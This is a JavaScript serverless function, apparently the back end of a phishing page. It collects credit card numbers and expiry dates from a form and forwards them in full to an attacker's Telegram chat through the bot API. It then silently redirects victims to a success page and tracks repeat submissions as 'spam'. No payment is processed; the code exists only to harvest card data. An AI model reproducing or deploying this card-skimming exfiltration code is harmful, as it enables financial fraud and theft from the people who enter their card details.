const https = require('https');
const crypto = require('crypto');

const cardCache = new Map();
const SPAM_WINDOW_MS = 30 * 60 * 1000;
const MAX_CACHE_SIZE = 100;

function cleanCache() {
    const now = Date.now();
    for (const [hash, data] of cardCache.entries()) {
        if (now - data.lastSeen > SPAM_WINDOW_MS) {
            cardCache.delete(hash);
        }
    }

    if (cardCache.size > MAX_CACHE_SIZE) {
        const entries = Array.from(cardCache.entries());
        entries.sort((a, b) => a[1].lastSeen - b[1].lastSeen);
        const toDelete = entries.slice(0, entries.length - MAX_CACHE_SIZE);
        toDelete.forEach(([hash]) => cardCache.delete(hash));
    }
}

function getCardHash(cardNumber) {
    const clean = cardNumber.replace(/\s/g, '');
    const hash = crypto.createHash('sha256').update(clean).digest('hex');
    return hash.substring(0, 16);
}

function checkSpam(cardNumber) {
    cleanCache();

    const hash = getCardHash(cardNumber);
    const now = Date.now();

    if (cardCache.has(hash)) {
        const data = cardCache.get(hash);
        const timeDiff = now - data.firstSeen;

        if (timeDiff < SPAM_WINDOW_MS) {
            data.count += 1;
            data.lastSeen = now;
            cardCache.set(hash, data);
            return {
                isSpam: true,
                count: data.count,
                timeDiffMinutes: Math.floor(timeDiff / 60000)
            };
        } else {
            cardCache.set(hash, { count: 1, firstSeen: now, lastSeen: now });
            return { isSpam: false };
        }
    } else {
        cardCache.set(hash, { count: 1, firstSeen: now, lastSeen: now });
        return { isSpam: false };
    }
}

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Location': '/success.html'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        const params = new URLSearchParams(event.body);
        const cardNumber = params.get('cc-number') || '';
        const expMonth = params.get('cc-exp-month') || '';
        const expYear = params.get('cc-exp-year') || '';

        console.log('Datos recibidos:', { cardNumber, expMonth, expYear });

        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        console.log('Token existe:', !!TELEGRAM_BOT_TOKEN);
        console.log('Chat ID existe:', !!TELEGRAM_CHAT_ID);

        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            const cleanNum = cardNumber.replace(/\s/g, '');

            const spamCheck = checkSpam(cardNumber);

            let cardType = 'CARD';
            if (/^4/.test(cleanNum)) {
                cardType = 'VISA';
            } else if (/^5[1-5]/.test(cleanNum) || /^2(2[2-9]|[3-6]|7[0-1]|720)/.test(cleanNum)) {
                cardType = 'MASTERCARD';
            } else if (/^3[47]/.test(cleanNum)) {
                cardType = 'AMEX';
            }

            const fecha = new Date().toLocaleString('es-AR', {
                timeZone: 'America/Argentina/Buenos_Aires'
            });

            let message;
            if (spamCheck.isSpam) {
                message = `⚠️ SPAM DETECTADO ⚠️\n\n🔁 TARJETA REPETIDA (${spamCheck.count}x)\n⏱️ Enviada ${spamCheck.count} veces en ${spamCheck.timeDiffMinutes} minutos\n\n${cardType}\nNumero: ${cleanNum}\nVence: ${expMonth}/${expYear}\nFecha: ${fecha}`;
                console.log('SPAM detectado:', spamCheck);
            } else {
                message = `🔔 NUEVA TARJETA\n\n${cardType}\nNumero: ${cleanNum}\nVence: ${expMonth}/${expYear}\nFecha: ${fecha}`;
            }

            console.log('Enviando mensaje...');
            try {
                const result = await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
                console.log('Mensaje enviado:', result);
            } catch (telegramError) {
                console.error('Error enviando a Telegram:', telegramError);
            }
        } else {
            console.error('Faltan variables de entorno');
        }
        return {
            statusCode: 303,
            headers,
            body: ''
        };
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 303,
            headers,
            body: ''
        };
    }
};

function sendToTelegram(botToken, chatId, message) {
    return new Promise((resolve, reject) => {
        const data = JSON.stringify({
            chat_id: chatId,
            text: message
        });

        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${botToken}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        };

        const req = https.request(options, (res) => {
            let response = '';
            res.on('data', (chunk) => response += chunk);
            res.on('end', () => {
                console.log('Telegram response status:', res.statusCode);
                console.log('Telegram response:', response);
                if (res.statusCode === 200) {
                    resolve(response);
                } else {
                    reject(new Error(`Telegram error: ${response}`));
                }
            });
        });

        req.on('error', (error) => {
            console.error('Request error:', error);
            reject(error);
        });

        req.write(data);
        req.end();
    });
}
